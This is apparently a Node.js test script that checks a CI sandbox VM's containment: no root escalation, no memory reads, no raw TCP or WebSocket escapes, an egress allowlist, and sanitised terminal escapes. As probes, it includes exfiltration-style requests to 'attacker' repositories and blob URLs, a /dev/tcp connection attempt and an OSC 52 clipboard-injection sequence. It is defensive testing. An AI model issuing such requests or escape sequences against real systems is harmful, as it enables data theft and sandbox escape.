// Check the containment claims in ../references/design.md from inside a VM built exactly as a
// real job's is: the same proxy (lib/proxy.mjs), the same root setup and job user
// (lib/guest.mjs), and the same output sanitiser. No GitHub runner and no credentials; it needs
// only the built guest.
//   node probe-containment.mjs        exits non-zero if any check fails
import { VM, MemoryProvider } from "@earendil-works/gondolin";
import { createProxy, loadAllowlist } from "./lib/proxy.mjs";
import { asRunner, assetsPath, ROOT_SETUP } from "./lib/guest.mjs";
import { takeSlot } from "./lib/slot.mjs";
import { createSanitizer, sanitize } from "./lib/terminal.mjs";

// Any repository will do: the probe only sees whether the policy lets the fetch through.
const repo = "actions/checkout";
const proxy = createProxy({ allowed: loadAllowlist("build"), repo, enforce: true });
const releaseSlot = await takeSlot({
  label: "containment probe",
  onWait: (current, waited) => waited < 5000 && console.error(`waiting for the VM slot: ${current?.label ?? "being taken"} (pid ${current?.pid}) has it`),
});
const vm = await VM.create({
  sandbox: { imagePath: assetsPath() },
  rootfs: { mode: "cow" },
  memory: "2G",
  cpus: 2,
  ...proxy.network,
  vfs: { mounts: { "/scratch": new MemoryProvider() } },
  sessionLabel: "gondolin-containment-probe",
});

const results = [];
const check = (name, pass, observed) => results.push({ name, pass, observed: sanitize(String(observed)).trim().slice(0, 70) });
const quote = (s) => `'${s.replaceAll("'", `'\\''`)}'`;
const asJobUser = async (script) => {
  const r = await vm.exec(asRunner(`bash -c ${quote(script)}`));
  return `${r.stdout}${r.stderr}`.trim();
};
const status = (method, url, extra = "") =>
  asJobUser(`curl -s -o /dev/null -w '%{http_code}' -X ${method} ${extra} '${url}' || echo curl-failed`);

try {
  const setup = await vm.exec(ROOT_SETUP.join(" && "));
  check("root setup succeeds", setup.exitCode === 0, `exit ${setup.exitCode}`);

  // --- the job's user has no way back to root
  const who = await asJobUser("id -un; id -u");
  check("job runs as an unprivileged user", /^runner\s+[1-9]\d*$/.test(who), who.replace(/\s+/g, " "));
  const sudo = await asJobUser("command -v sudo || echo absent; ls /etc/sudoers.d 2>/dev/null | tr '\\n' ' '");
  check("sudo is not installed and grants nothing", sudo.startsWith("absent"), sudo);
  const escalate = await asJobUser("su -c 'id -u' root </dev/null 2>&1; echo status=$?");
  check("su cannot reach root", !/^0$/m.test(escalate) && /status=[1-9]/.test(escalate), escalate.replace(/\s+/g, " "));

  // Losing root must not cost the job anything it needs: the runner agent and its toolchain.
  const agent = await asJobUser("cd /home/runner/actions-runner && ./bin/Runner.Listener --version; node --version; python3 --version");
  check("runner agent and toolchain run as the job user", /^2\.\d+\.\d+/.test(agent) && /v\d+/.test(agent), agent.replace(/\s+/g, " "));
  // The browser suites find Chromium already in the job user's cache instead of downloading it.
  const browsers = await asJobUser("ls ~/.cache/ms-playwright | tr '\\n' ' '");
  check("Playwright's Chromium is baked in for the job user", /chromium-\d+/.test(browsers) && /chromium_headless_shell-\d+/.test(browsers), browsers);
  // setup-bun looks only here, and skips its fetch when a job pins the version it finds.
  const bun = await asJobUser("~/.bun/bin/bun --revision");
  check("bun is baked in for the job user", /^\d+\.\d+\.\d+/.test(bun), bun);

  // --- the job's user cannot read another process's memory, Runner.Worker's included
  const scope = await vm.exec("cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null || echo no-yama");
  check("Yama ptrace_scope is 2", scope.stdout.trim() === "2", scope.stdout);
  const memory = await asJobUser(
    "sleep 60 & pid=$!; python3 -c \"open('/proc/$pid/mem','rb')\" 2>/dev/null && echo mem-open || echo mem-denied; " +
      "cat /proc/$pid/environ >/dev/null 2>&1 && echo environ-readable || echo environ-denied; kill $pid",
  );
  check("same-user memory read is refused", memory.includes("mem-denied"), memory.replace(/\s+/g, " "));
  // Recorded, not required: Yama does not govern /proc/<pid>/environ, which is why the egress
  // policy must not assume the job's runtime token stays secret.
  check("residual: same-user environ still readable (expected)", memory.includes("environ-readable"), memory.replace(/\s+/g, " "));

  // --- nothing of the host, and no way out but HTTP
  const mounts = await asJobUser("test -e /Users && echo present || echo absent");
  check("the host's filesystem is not in the guest", mounts === "absent", mounts);
  const tcp = await asJobUser("timeout 5 bash -c 'exec 3<>/dev/tcp/1.1.1.1/22 && head -c 4 <&3' 2>/dev/null && echo connected || echo refused");
  check("non-HTTP TCP goes nowhere", tcp.endsWith("refused"), tcp);
  const upgrade = await asJobUser("curl -s -o /dev/null -w '%{http_code}' --http1.1 -H 'Connection: Upgrade' -H 'Upgrade: websocket' -H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Key: cHJvYmU=' https://github.com/");
  check("a WebSocket upgrade is refused", upgrade === "501", `http ${upgrade}`);

  // --- egress: reads pass, writes only where named
  const RESULTS = "https://results-receiver.actions.githubusercontent.com/twirp";
  const egress = [
    ["read github.com", "GET", "https://github.com/", "", false],
    ["read PyPI", "GET", "https://pypi.org/simple/pip/", "", false],
    ["fetch the repository under test", "POST", `https://github.com/${repo}.git/git-upload-pack`, "", false],
    ["npm audit", "POST", "https://registry.npmjs.org/-/npm/v1/security/advisories/bulk", "-H 'content-type: application/json' -d '{}'", false],
    ["create a gist", "POST", "https://api.github.com/gists", "-d '{}'", true],
    ["push to another repository", "POST", "https://github.com/attacker/drop.git/git-receive-pack", "", true],
    ["write the default branch's cache", "POST", `${RESULTS}/github.actions.results.api.v1.CacheService/CreateCacheEntry`, "-d '{}'", true],
    ["write the default branch's cache via %2F", "POST", `${RESULTS}/github.actions.results.api.v1.CacheService%2FCreateCacheEntry`, "-d '{}'", true],
    ["publish to npm", "PUT", "https://registry.npmjs.org/gondolin-probe-never", "-d '{}'", true],
    ["write to a blob URL this job was never handed", "PUT", "https://productionresultssa7.blob.core.windows.net/actions-results/attacker/drop.txt?sv=x&sig=theirs", "-H 'x-ms-blob-type: BlockBlob' -d secret", true],
    ["GET dressed as POST", "GET", "https://api.github.com/gists/probe-get-as-post", "-H 'X-HTTP-Method-Override: POST'", true],
    ["POST dressed as GET", "POST", "https://api.github.com/gists/probe-post-as-get", "-H 'X-HTTP-Method-Override: GET' -d '{}'", true],
  ];
  // Each row is judged by finding its own method and URL in the report, so no two may share them.
  const keys = egress.map(([, method, url]) => `${method} ${url.split("?")[0]}`);
  if (new Set(keys).size !== keys.length) throw new Error("egress probe rows must have distinct method and URL");
  const codes = [];
  for (const [, method, url, extra] of egress) codes.push(await status(method, url, extra));
  const refusedLines = proxy.report().filter((line) => line.startsWith("--- refused"));
  egress.forEach(([name, method, url, , expectRefused], i) => {
    const bare = url.split("?")[0].slice(0, 140);
    const wasRefused = refusedLines.some((line) => line.includes(`${method} ${bare} (`));
    check(`${expectRefused ? "refused" : "allowed"}: ${name}`, wasRefused === expectRefused, `http ${codes[i]}${wasRefused ? ", proxy refused" : ""}`);
  });
  // A checkout's pack runs past 64 MB, gondolin's cap on a response it has to buffer. It buffers
  // every response once an onResponse hook exists, so this row fails the moment one comes back.
  // curl reads the headers and stops; a buffered response answers 502 before sending any.
  const big = "https://files.pythonhosted.org/packages/a9/18/81c399e8f4f1580d34bf99d827cb5fb5cf7a18a266bb5d30ca3ec2e89ba6/torch-2.5.1-cp39-cp39-manylinux1_x86_64.whl";
  const large = await asJobUser(`curl -s -o /dev/null -w '%{http_code}' --max-filesize 1000 '${big}'; true`);
  check("a response over 64 MB streams through", large === "200", `http ${large} for a 906 MB file`);

  const offList = await status("GET", "https://example.com/");
  const denied = proxy.report().some((line) => line.startsWith("--- denied example.com"));
  check("a host off the allowlist is unreachable", denied, `http ${offList}`);

  // --- the guest cannot drive the operator's terminal
  const osc52 = "printf 'before\\033]52;c;cHduZWQ=\\007after\\033[2J\\n'";
  // Read it the way run-job.mjs does: piped output arrives as stream events, not in the result.
  const proc = vm.exec(osc52, { stdout: "pipe", stderr: "pipe", pty: true });
  const chunks = [];
  proc.stdout.on("data", (chunk) => chunks.push(Buffer.from(chunk)));
  await proc;
  const raw = Buffer.concat(chunks);
  const filter = createSanitizer();
  const shown = filter.write(raw) + filter.end();
  check("control: the guest really emitted OSC 52", raw.includes("\x1b]52"), JSON.stringify(raw.toString().slice(0, 40)));
  check("OSC 52 and screen clears never reach the terminal", !shown.includes("\x1b]") && !shown.includes("\x1b[2J"), JSON.stringify(shown));
} finally {
  await vm.close();
  releaseSlot();
}

const width = Math.max(...results.map((r) => r.name.length));
for (const r of results) console.log(`${r.pass ? "PASS" : "FAIL"}  ${r.name.padEnd(width)}  ${r.observed}`);
const failed = results.filter((r) => !r.pass).length;
console.log(`\n${results.length - failed}/${results.length} checks passed against ${assetsPath()}`);
console.log(proxy.report().join("\n"));
process.exit(failed ? 1 : 0);
